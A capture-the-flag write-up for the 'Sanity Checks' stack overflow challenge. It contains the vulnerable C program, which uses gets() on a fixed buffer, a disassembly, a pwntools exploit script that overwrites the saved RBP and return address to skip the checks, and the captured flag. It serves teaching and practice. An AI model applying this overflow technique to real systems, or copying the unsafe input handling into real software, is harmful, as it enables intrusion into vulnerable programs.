# Sanity Checks

I made a program (source) to protect my flag. On the off chance someone does get in, I added some sanity checks to detect if something fishy is going on. See if you can hack me at /problems/2021/sanity_checks on the shell server, or connect with nc shell.actf.co 21303.

Author: kmh

## Challenge

We are presented with a login prompt.
If we enter the correct password, the program will check some variables and, if they are set to the correct values, will print the flag.
However, none of the variables are set to the correct values initially, and the user is not prompted to change them.

### Mitigations

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

### Source code

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void main(){
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    char password[64];
    int ways_to_leave_your_lover = 0;
    int what_i_cant_drive = 0;
    int when_im_walking_out_on_center_circle = 0;
    int which_highway_to_take_my_telephones_to = 0;
    int when_i_learned_the_truth = 0;
    
    printf("Enter the secret word: ");
    
    gets(&password);
    
    if(strcmp(password, "password123") == 0){
        puts("Logged in! Let's just do some quick checks to make sure everything's in order...");
        if (ways_to_leave_your_lover == 50) {
            if (what_i_cant_drive == 55) {
                if (when_im_walking_out_on_center_circle == 245) {
                    if (which_highway_to_take_my_telephones_to == 61) {
                        if (when_i_learned_the_truth == 17) {
                            char flag[128];
                            
                            FILE *f = fopen("flag.txt","r");
                            
                            if (!f) {
                                printf("Missing flag.txt. Contact an admin if you see this on remote.");
                                exit(1);
                            }
                            
                            fgets(flag, 128, f);
                            
                            printf(flag);
                            return;
                        }
                    }
                }
            }
        }
        puts("Nope, something seems off.");
    } else {
        puts("Login failed!");
    }
}
```

## Solution

We can see from disassembling the program that the variables it checks are at higher addresses than the buffer:

```asm
[0x004010b0]> pdf @ main
            ; DATA XREF from entry0 @ 0x4010d1
┌ 327: int main (int argc, char **argv, char **envp);
│           ; var char *format @ rbp-0xe0
│           ; var char *s1 @ rbp-0x60
│           ; var file*stream @ rbp-0x20
│           ; var uint32_t var_14h @ rbp-0x14
│           ; var uint32_t var_10h @ rbp-0x10
│           ; var uint32_t var_ch @ rbp-0xc
│           ; var uint32_t var_8h @ rbp-0x8
│           ; var uint32_t var_4h @ rbp-0x4
```

So if we overflow the buffer, we can overwrite the values stored in these variables.

Alternatively, we can just overwrite the stored RIP to jump inside the main function after these tests, so that we skip them and print the flag.
This is the method used in the exploit script below.

```asm
│  ││││││   0x0040125a      488d35200e00.  lea rsi, [0x00402081]       ; "r" ; const char *mode
│  ││││││   0x00401261      488d3d1b0e00.  lea rdi, str.flag.txt       ; 0x402083 ; "flag.txt" ; const char *filename
│  ││││││   0x00401268      e823feffff     call sym.imp.fopen          ; file*fopen(const char *filename, const char *mode)
│  ││││││   0x0040126d      488945e0       mov qword [stream], rax
│  ││││││   0x00401271      48837de000     cmp qword [stream], 0
│ ┌───────< 0x00401276      751b           jne 0x401293
│ │││││││   0x00401278      488d3d110e00.  lea rdi, str.Missing_flag.txt._Contact_an_admin_if_you_see_this_on_remote. ; 0x402090 ; "Missing flag.txt. Contact an admin if you see this on remote." ; const char *format
│ │││││││   0x0040127f      b800000000     mov eax, 0
│ │││││││   0x00401284      e8c7fdffff     call sym.imp.printf         ; int printf(const char *format)
│ │││││││   0x00401289      bf01000000     mov edi, 1                  ; int status
│ │││││││   0x0040128e      e80dfeffff     call sym.imp.exit           ; void exit(int status)
│ │││││││   ; CODE XREF from main @ 0x401276
│ └───────> 0x00401293      488b55e0       mov rdx, qword [stream]     ; FILE *stream
│  ││││││   0x00401297      488d8520ffff.  lea rax, [format]
│  ││││││   0x0040129e      be80000000     mov esi, 0x80               ; 128 ; int size
│  ││││││   0x004012a3      4889c7         mov rdi, rax                ; char *s
│  ││││││   0x004012a6      e8b5fdffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
│  ││││││   0x004012ab      488d8520ffff.  lea rax, [format]
│  ││││││   0x004012b2      4889c7         mov rdi, rax                ; const char *format
│  ││││││   0x004012b5      b800000000     mov eax, 0
│  ││││││   0x004012ba      e891fdffff     call sym.imp.printf         ; int printf(const char *format)
```

This method is similar to the approach for tranquil, the previous problem, except we also need to make sure the saved RBP is overwritten such that RBP-0xe0 is writable, as this is where the flag will be read into.
To do so, we can use the data section for the binary, which is always known due to PIE being disabled.

## Exploit

```py
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host shell.actf.co --port 21303 checks
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('checks')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'shell.actf.co'
port = int(args.PORT or 21303)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

win = 0x0040125a
data = 0x405000

payload = flat({0x60: [data, win]})

io.sendline(payload)

io.interactive()
```

## Flag

`actf{if_you_aint_bout_flags_then_i_dont_mess_with_yall}`

